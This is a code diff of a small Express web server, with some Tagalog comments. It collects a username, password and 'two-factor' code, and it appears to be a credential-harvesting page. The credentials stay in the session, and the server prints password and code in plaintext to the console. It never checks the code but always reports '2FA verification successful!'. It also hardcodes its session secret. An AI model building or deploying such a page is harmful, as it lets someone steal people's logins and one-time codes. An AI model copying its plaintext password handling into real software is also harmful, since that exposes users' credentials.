@@ -1,97 +1,94 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const session = require('express-session');
+const RedisStore = require('connect-redis')(session);
+const { createClient } = require('redis');
 
 const app = express();
 const PORT = 3000;
 
-// Middleware for parsing request bodies
+// Redis client setup
+const redisClient = createClient({
+  legacyMode: true, // Gamitin kung may compatibility issues
+  url: 'redis://localhost:6379',
+});
+redisClient.connect().catch(console.error);
+
+// Middleware for parsing
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Middleware for session management
+// Session middleware
 app.use(
   session({
-    secret: 'mysecretkey', // Replace with a strong secret in production
+    store: new RedisStore({ client: redisClient }),
+    secret: 'supersecretkey', // Palitan ng mas secure na secret
     resave: false,
-    saveUninitialized: true,
-    cookie: { secure: false, maxAge: 60000 }, // Use secure: true for HTTPS only
+    saveUninitialized: false,
+    cookie: { maxAge: 5 * 60 * 1000 }, // 5 minutes expiry
   })
 );
 
-// Serve static files (e.g., CSS/JS)
+// Serve static files (CSS, JS)
 app.use(express.static('public'));
 
-// Login Form
+// Route: Home page
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/index.html');
 });
 
-// Handle login form submission
+// Route: Handle login
 app.post('/submit', (req, res) => {
-  const username = req.body.username;
-  const password = req.body.password;
+  const { username, password } = req.body;
 
-  // Save login data in session
+  if (!username || !password) {
+    res.status(400).send('Missing username or password.');
+    return;
+  }
+
+  // Save username and password in session
   req.session.username = username;
   req.session.password = password;
 
-  console.log('Session after /submit:', req.session); // Debugging line
+  // Log data
+  console.log(`Login Attempt - Username: ${username}, Password: ${password}`);
 
-  // Redirect to 2FA page
-  res.redirect('/2fa');
+  res.redirect('/two-factor');
 });
 
-// 2FA Form
-app.get('/2fa', (req, res) => {
-  console.log('Session Data at /2fa:', req.session); // Debugging line
-
+// Route: Two-Factor Authentication Page
+app.get('/two-factor', (req, res) => {
   if (!req.session.username || !req.session.password) {
-    console.log('Redirecting to login because session data is missing.');
-    return res.redirect('/'); // Redirect to login if session is empty
+    return res.status(403).send('Session data is missing. Please log in again.');
   }
 
   res.send(`
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Two-Factor Authentication</title>
-    </head>
-    <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-      <h1>Two-Factor Authentication</h1>
-      <form action="/verify-2fa" method="POST">
-        <input type="number" name="authCode" placeholder="Enter 2FA Code" required>
-        <button type="submit">Verify</button>
-      </form>
-    </body>
-    </html>
+    <form action="/verify-2fa" method="POST">
+      <input type="number" name="authCode" placeholder="Enter 2FA Code" required>
+      <button type="submit">Verify</button>
+    </form>
   `);
 });
 
-// Handle 2FA verification
+// Route: Verify Two-Factor Code
 app.post('/verify-2fa', (req, res) => {
-  const authCode = req.body.authCode;
+  const { authCode } = req.body;
 
-  console.log('Session Data at /verify-2fa:', req.session); // Debugging line
-
-  const username = req.session.username;
-  const password = req.session.password;
-
-  if (!username || !password) {
-    console.log('Error: Session data is missing.');
-    return res.send('Error: Session expired. Please log in again.');
+  // Check session data
+  if (!req.session.username || !req.session.password) {
+    console.error('Error: Session data is missing.');
+    res.status(403).send('Session expired. Please log in again.');
+    return;
   }
 
-  console.log(`2FA Verification Attempt - Username: ${username}, Password: ${password}, 2FA Code: ${authCode}`);
+  // Log data
+  console.log(
+    `2FA Verification Attempt - Username: ${req.session.username}, Password: ${req.session.password}, 2FA Code: ${authCode}`
+  );
 
-  // Destroy session after successful verification
-  req.session.destroy();
-
-  res.send('Two-Factor Authentication successful! Check your terminal for logs.');
+  res.send('2FA verification successful!');
 });
 
-// Start the server
+// Start server
 app.listen(PORT, () => {
   console.log(`Server is running at http://localhost:${PORT}`);
 });
